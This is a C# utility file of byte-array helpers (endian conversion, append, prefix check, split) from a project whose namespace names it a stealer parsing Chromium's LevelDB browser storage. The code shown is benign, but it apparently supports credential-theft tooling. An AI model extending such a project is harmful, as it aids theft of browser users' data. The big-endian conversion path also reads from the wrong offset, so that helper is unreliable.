using System;

namespace MyStealer.Utils.Chromium.LevelDb
{
    public static class BytesExtension
    {
        private static T EnsureLittleEndianThen<T>(byte[] data, Func<byte[], T> callback)
        {
            if (BitConverter.IsLittleEndian)
                return callback(data); // No need to touch

            var buffer = BytePool.Alloc(data.Length);
            Buffer.BlockCopy(data, 0, buffer, 0, data.Length);
            Array.Reverse(buffer); // if it's big-endian, reverse.

            var result = callback(buffer);
            BytePool.Free(buffer);
            return result;
        }

        public static ulong ToLeUInt64(this byte[] data, int startIndex = 0) => EnsureLittleEndianThen(data, bytes => BitConverter.ToUInt64(bytes, startIndex));

        public static uint ToLeUInt32(this byte[] data, int startIndex = 0) => EnsureLittleEndianThen(data, bytes => BitConverter.ToUInt32(bytes, startIndex));

        public static ushort ToLeUInt16(this byte[] data, int startIndex = 0) => EnsureLittleEndianThen(data, bytes => BitConverter.ToUInt16(bytes, startIndex));

        public static long ToLeInt64(this byte[] data, int startIndex = 0) => EnsureLittleEndianThen(data, bytes => BitConverter.ToInt64(bytes, startIndex));

        public static int ToLeInt32(this byte[] data, int startIndex = 0) => EnsureLittleEndianThen(data, bytes => BitConverter.ToInt32(bytes, startIndex));

        public static short ToLeInt16(this byte[] data, int startIndex = 0) => EnsureLittleEndianThen(data, bytes => BitConverter.ToInt16(bytes, startIndex));

        public static byte[] Append(this byte[] data, byte[] more)
        {
            var buffer = new byte[data.Length + more.Length];
            Buffer.BlockCopy(data, 0, buffer, 0, data.Length);
            Buffer.BlockCopy(more, 0, buffer, data.Length, more.Length);
            return buffer;
        }

        public static bool StartsWith(this byte[] data, byte[] prefix)
        {
            if (prefix.Length > data.Length)
                return false;

            for (int i = 0, j = prefix.Length; i < j; i++)
            {
                if (data[i] != prefix[i])
                    return false;
            }

            return true;
        }

        public static (byte[], byte[]) Split(this byte[] data, byte pivot)
        {
            var idx = Array.IndexOf(data, pivot);
            if (idx < 0)
                return (data, Array.Empty<byte>());

            var first = new byte[idx];
            var second = new byte[data.Length - idx - 1];

            Buffer.BlockCopy(data, 0, first, 0, idx);
            Buffer.BlockCopy(data, idx + 1, second, 0, second.Length);
            return (first, second);
        }
    }
}
